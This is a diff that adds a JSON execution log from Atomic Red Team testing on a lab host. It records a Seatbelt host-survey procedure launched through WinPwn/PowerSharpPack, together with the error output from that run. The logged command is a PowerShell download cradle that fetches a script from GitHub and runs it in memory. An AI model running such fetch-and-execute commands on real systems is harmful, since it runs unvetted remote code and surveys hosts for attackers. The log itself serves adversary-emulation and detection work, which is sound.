@@ -1,0 +1,48 @@
+{
+    "attire-version":  "1.1",
+    "execution-data":  {
+                           "execution-source":  "Invoke-Atomicredteam",
+                           "execution-id":  "NWZiNzMzMTktNWYxOS00MDgwLWIyODctNTFkMmE2Njc5YzYz",
+                           "execution-category":  {
+                                                      "name":  "Atomic Red Team",
+                                                      "abbreviation":  "ART"
+                                                  },
+                           "execution-command":  "Invoke-AtomicTest T1082 -TestGuids 5c16ceb4-ba3a-43d7-b848-a13c1f216d95 -PathToAtomicsFolder C:\\AtomicRedTeam\\atomics -ExecutionLogPath C:\\AtomicRedTeam\\invoke-atomicredteam\\Logs\\T1082-5c16ceb4-ba3a-43d7-b848-a13c1f216d95.json -TimeoutSeconds 120 -LoggingModule Attire-ExecutionLogger",
+                           "target":  {
+                                          "user":  "redshirt\\edrba",
+                                          "host":  "RedShirt",
+                                          "ip":  "192.168.56.1",
+                                          "path":  "C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\edrba\\AppData\\Local\\Microsoft\\WindowsApps"
+                                      },
+                           "time-generated":  "2024-10-12T18:07:47.000Z"
+                       },
+    "procedures":  [
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - PowerSharpPack - Seatbelt",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "5c16ceb4-ba3a-43d7-b848-a13c1f216d95"
+                                            },
+                           "procedure-description":  "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
+                           "order":  23,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:43.000Z",
+                                             "time-stop":  "2024-10-12T18:07:47.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1)\nInvoke-Seatbelt -Command \"-group=all\"",
+                                             "output":  [
+                                                            {
+                                                                "content":  "Exception calling \"Load\" with \"1\" argument(s): \"Could not load file or assembly 608256 bytes loaded from Anonymously \r\nHosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null or one of its dependencies. An \r\nattempt was made to load a program with an incorrect format.\"\r\nAt line:14 char:5\r\n+     $RAS = [System.Reflection.Assembly]::Load($byteOutArray)\r\n+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : BadImageFormatException\r\n \r\nUnable to find type [AnschnallGurt.Program].\r\nAt line:22 char:5\r\n+     [AnschnallGurt.Program]::Main($Command)\r\n+     ~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : InvalidOperation: (AnschnallGurt.Program:TypeName) [], RuntimeException\r\n    + FullyQualifiedErrorId : TypeNotFound",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       }
+                   ]
+}
+
